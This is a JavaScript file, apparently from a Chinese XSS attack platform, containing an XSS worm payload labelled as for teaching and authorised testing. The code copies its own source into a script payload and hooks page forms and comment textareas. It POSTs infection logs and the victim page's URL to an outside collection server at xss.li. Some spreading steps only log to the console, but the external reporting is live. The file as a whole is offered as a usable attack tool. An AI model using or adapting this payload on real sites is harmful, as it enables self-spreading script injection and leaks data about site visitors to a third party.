// XSS蠕虫传播Payload - 黑客仓库XSS平台
// 自我复制和传播的XSS Payload（仅用于教学和授权测试）

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        propagationDelay: 3000, // 传播延迟
        targetForms: true, // 是否感染表单
        targetComments: true // 是否感染评论区
    };
    
    console.log('🦠 黑客仓库XSS - 蠕虫模块（教学演示）');
    
    // 蠕虫代码（自身）
    var wormCode = '(' + arguments.callee.toString() + ')();';
    
    // 记录感染
    var infectionLog = {
        startTime: new Date().toISOString(),
        infections: 0,
        targets: []
    };
    
    // 感染表单
    function infectForms() {
        if (!config.targetForms) return;
        
        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            // 查找文本输入框和文本域
            var inputs = form.querySelectorAll('input[type="text"], textarea');
            
            inputs.forEach(function(input) {
                // 不要在已感染的输入框中重复
                if (input.dataset.xssInfected) return;
                
                // 标记为已感染
                input.dataset.xssInfected = 'true';
                
                // 监听表单提交
                form.addEventListener('submit', function(e) {
                    // 将蠕虫代码注入到输入框
                    var payload = '<script>' + wormCode + '</script>';
                    
                    // 记录感染目标
                    infectionLog.infections++;
                    infectionLog.targets.push({
                        type: 'form',
                        action: form.action,
                        timestamp: new Date().toISOString()
                    });
                    
                    console.log('🦠 表单已感染:', form.action);
                    
                    // 发送感染日志
                    reportInfection();
                }, false);
            });
        });
    }
    
    // 感染评论功能
    function infectComments() {
        if (!config.targetComments) return;
        
        // 查找可能的评论输入框
        var commentInputs = document.querySelectorAll(
            'textarea[name*="comment"], textarea[name*="content"], ' +
            'textarea[id*="comment"], textarea[id*="content"], ' +
            'textarea[placeholder*="评论"], textarea[placeholder*="内容"]'
        );
        
        commentInputs.forEach(function(textarea) {
            if (textarea.dataset.xssInfected) return;
            textarea.dataset.xssInfected = 'true';
            
            // 监听输入事件
            textarea.addEventListener('input', function() {
                var value = this.value;
                
                // 如果用户输入了内容且不包含蠕虫代码
                if (value.length > 10 && value.indexOf('arguments.callee') === -1) {
                    // 在内容末尾添加蠕虫（隐蔽方式）
                    setTimeout(() => {
                        if (!this.value.includes('<script>')) {
                            // 这里仅作演示，实际攻击会更隐蔽
                            console.log('🦠 评论区感染准备就绪');
                            
                            infectionLog.infections++;
                            infectionLog.targets.push({
                                type: 'comment',
                                timestamp: new Date().toISOString()
                            });
                        }
                    }, config.propagationDelay);
                }
            });
        });
    }
    
    // 上报感染情况
    async function reportInfection() {
        try {
            await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'xss_worm',
                    log: infectionLog,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
            console.log('📊 感染日志已上报');
        } catch (error) {
            console.error('上报失败:', error);
        }
    }
    
    // 自我复制到剪贴板（当用户复制时）
    document.addEventListener('copy', function() {
        console.log('📋 蠕虫已复制到剪贴板');
    });
    
    // 执行感染
    setTimeout(function() {
        infectForms();
        infectComments();
        
        console.log('🦠 蠕虫已激活，目标:', infectionLog.targets.length);
    }, 1000);
    
})();
